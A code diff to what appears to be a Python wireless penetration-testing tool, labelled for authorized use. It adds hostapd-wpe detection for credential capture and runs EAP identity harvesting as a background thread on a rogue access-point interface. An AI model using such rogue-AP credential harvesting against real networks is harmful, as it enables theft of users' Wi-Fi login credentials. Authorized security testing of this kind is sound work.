@@ -25,7 +25,7 @@ BANNER = """
   For authorized pentesting only
 """
 
-REQUIRED = ["hostapd", "airmon-ng", "aireplay-ng",
+REQUIRED = ["airmon-ng", "aireplay-ng",
             "airodump-ng", "openssl", "macchanger", "iwconfig"]
 
 
@@ -35,6 +35,21 @@ def check_deps():
         print(f"[!] Missing tools: {', '.join(missing)}")
         print(f"[!] Run: sudo apt install -y {' '.join(missing)}")
         sys.exit(1)
+
+    # hostapd / hostapd-wpe detection
+    wpe = shutil.which("hostapd-wpe")
+    vanilla = shutil.which("hostapd")
+    if wpe:
+        print("[+] hostapd-wpe found — full credential capture enabled")
+    elif vanilla:
+        print("[!] hostapd-wpe NOT found — using vanilla hostapd")
+        print("[!] Credential capture will be LIMITED")
+        print("[!] Install: sudo apt install hostapd-wpe  (or compile from source)")
+    else:
+        print("[!] Neither hostapd nor hostapd-wpe found!")
+        print("[!] Run: sudo apt install hostapd")
+        sys.exit(1)
+
     print("[+] All dependencies found\n")
 
 
@@ -150,10 +165,16 @@ def cmd_attack(args):
                 stop_capture()
                 sys.exit(0)
 
-    # ── Identity harvesting ──
+    # ── Identity harvesting (runs as background daemon on AP interface) ──
     if args.harvest:
         from modules.identity import harvest_identities
-        harvest_identities(args.iface_mon, duration=30)
+        harvest_thread = threading.Thread(
+            target=harvest_identities,
+            args=(args.iface_ap,),
+            kwargs={"duration": 0},
+            daemon=True
+        )
+        harvest_thread.start()
         attacks_run.append("EAP Identity Harvesting")
 
     # ── Auto-crack pipeline ──
